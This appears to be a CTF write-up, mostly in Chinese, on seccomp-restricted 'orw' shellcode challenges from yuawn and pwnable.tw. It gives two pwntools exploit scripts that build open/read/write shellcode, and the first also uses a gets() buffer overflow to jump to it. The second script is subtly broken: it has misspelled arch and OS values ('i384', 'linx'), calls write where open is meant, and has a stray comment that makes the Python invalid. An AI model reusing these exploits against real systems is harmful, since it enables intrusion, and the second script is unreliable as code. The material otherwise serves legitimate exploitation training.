---
title: pwnable orw & yuawn orw Writes up
published: 2024-08-07
tags: [CTF]
category: Cyber Security
draft: false
image: 'image.png'
---

## pwntools Review

設定環境:

``` py
context(arch='i386',os='linux')
```

## 暫存器 Review

|  暫存器   | 位元  |
|  ----  | ----  |
| rax  | 64 |
| eax  | 32 |

## What is orw
利用 open，read and write  這三個 systemcall 去取得 flag

## What is seccomp?
分析程式的 seccomp 狀態，查看哪一些 system call 被禁用

download :
```
sudo apt install gcc ruby-dev
gem install seccomp-tools
```

## 起手式

`seccomp-tools dump <filename>`


## demo yuawn orw (64 bits)

### Recon

file:

![image](https://hackmd.io/_uploads/SJLwfuk5R.png)

r2:

![image](https://hackmd.io/_uploads/r1FOMdy5R.png)

發現 sc 的部分是全域變數，然後他有給你位置，並且下面有一個 I give you bof 是用 gets 去讀，並且大小為 0x10+0x8

seccomp:

![image](https://hackmd.io/_uploads/BkPAGOJqR.png)

### exploit

``` py
from pwn import *

context(arch='amd64',os='linux')

r=process('./orw')
                                                        #利用('rax','rsp')去寫入
r.sendline(asm(shellcraft.open('/flag')+shellcraft.read('rax','rsp',0x100)+shellcraft.write(1,'rsp',0x100)))
                        #利用(1,'rsp',0x100)去寫入
r.sendlineafter(b':)', b'a'*0x18 + p64(0x6010a0))
r.interactive()
```


## demo pwnable orw (32 bits)

labs: https://pwnable.tw/static/chall/orw

### Recon

file: 

![image](https://hackmd.io/_uploads/B1EEY7150.png)

checksec:

![image](https://hackmd.io/_uploads/BJkBFX1qC.png)

exec: 

![image](https://hackmd.io/_uploads/BJOQsQ1q0.png)

seccomp:

![image](https://hackmd.io/_uploads/S1gYoXJ90.png)

disas main:

![image](https://hackmd.io/_uploads/HJR5smJcC.png)


### exploit

``` py

from pwn import *

context(arch='i384',os='linx')

r=remote('chall.pwnable.tw',10001)
                                         #讀利用(eax,esp,大小)
sc=asm(shellcraft.write('/home/orw/flag')+shellcraft.read('eax','ebp',0x100)+shellcraft.write(1,'ebp',0x100)) 寫利用(1,'esp',大小)

r.sendlineafter(':',sc)

r.interactive()
```


## References:

https://kazma.tw/2023/12/10/Yuawn-Pwn1-orw-Writeup/

https://kazma.tw/2024/02/07/Pwnable-tw-orw-Writeup/

https://www.youtube.com/watch?v=U8N6aE-Nq-Q 